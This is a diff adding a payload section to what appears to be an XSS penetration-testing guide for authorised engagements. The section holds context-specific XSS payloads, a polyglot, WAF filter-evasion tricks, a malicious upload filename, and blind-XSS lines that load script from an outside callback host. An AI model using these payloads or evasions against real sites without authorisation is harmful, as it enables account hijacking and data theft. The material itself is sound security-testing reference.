@@ -31,6 +31,67 @@ nist_csf:
 - When assessing client-side security of single-page applications (SPAs)
 - During bug bounty programs targeting XSS vulnerabilities
 
+## Critical: Payload Matrix and Bypasses (checklist-derived)
+
+### Context-based payload matrix
+```
+# HTML body context
+<svg onload=alert(1)>
+<img src=x onerror=alert(1)>
+
+# HTML attribute breakout (inside value="...")
+"><svg onload=alert(1)>
+" onfocus=alert(1) autofocus=
+
+# Inside a JS string (var x = '...';)
+';alert(1)//
+</script><svg onload=alert(1)>
+
+# Inside URL / href attribute
+javascript:alert(1)
+
+# Filtered-tag fallbacks (when script/img/svg are blocked)
+<details open ontoggle=alert(1)>
+<video><source onerror=alert(1)>
+```
+
+### Strong polyglot (fires across many contexts at once)
+```
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+```
+
+### WAF / filter evasion
+- **Case toggling:** `<ScRiPt>`, `oNloAd=`, `JaVaScRiPt:`.
+- **Encoding:** HTML-entity (`&#x61;lert`), URL (`%3Cscript%3E`), and double-encoding (`%253Cscript%253E`) when one decode pass happens before validation.
+- **No-space variants:** `<svg/onload=alert(1)>`, `<img/src=x/onerror=alert(1)>` (use `/` instead of spaces).
+- **Newline regex break:** insert `\r\n` (`%0d%0a`) inside the payload to break single-line regex filters.
+- **Method-change bypass (POST→GET):** if a parameter is filtered on POST, resend it as a GET query parameter (or vice-versa) — filters are often applied to only one method.
+
+### Filename XSS in uploads
+```
+"><img src=x onerror=alert(document.domain)>.png
+```
+Use as the uploaded file's name; fires when the filename is reflected unencoded in listings/pages.
+
+### DOM-XSS sinks and sources
+- **Sinks:** `innerHTML`, `outerHTML`, `document.write`, `location` / `location.href`, `eval`, `setTimeout("...")`, `$().html()`.
+- **Sources:** `location.hash`, `location.search`, `document.referrer`, `window.name`, `postMessage` data.
+- Trace source→sink with DOM Invader; test fragment payloads like `#<img src=x onerror=alert(1)>`.
+
+### Blind XSS (stored, fires elsewhere)
+- Plant a **canary callback** payload (XSS Hunter / interactsh) in fields that render in admin/back-office views: contact, support tickets, address, user-agent, referrer.
+- Example: `"><script src=//xss.canary.host></script>` — an inbound callback proves execution in a context you cannot see.
+
+## How to CONFIRM a Hit (avoid false negatives)
+
+A reflection in the response is **not** a confirmed XSS — confirm the payload actually **executes in its context** (an `alert()`/`prompt()` pop, a visible DOM mutation, or an OOB beacon hit), not merely that the string appears in the HTML:
+- **Reflected:** the payload fires on the same response that carries it; verify in a real browser, since output encoding may neutralise a raw-text reflection.
+- **Stored:** submit, then load the *rendering* page (and any admin/back-office view) and confirm execution there — persistence without execution is not yet proven.
+- **DOM-based:** trace source→sink with DOM Invader; confirm a fragment payload like `#<img src=x onerror=alert(1)>` actually reaches a sink (`innerHTML`, `document.write`, `eval`) and runs.
+- **Blind/stored elsewhere:** plant an XSS-Hunter / `interactsh` callback (`"><script src=//<id>.xss.host></script>`); an inbound hit proves execution in a context you cannot see.
+
+Match the payload to the reflection **context** (HTML body / attribute / JS string / URL) before deciding it failed. If a filter strips your payload, do not conclude negative until you confirm a **bypass actually fires** — case toggling, no-space `/` variants, encoding / double-encoding, a newline-broken regex, or a POST→GET method switch.
+
 ## Prerequisites
 
 - **Authorization**: Written scope and rules of engagement for the target application
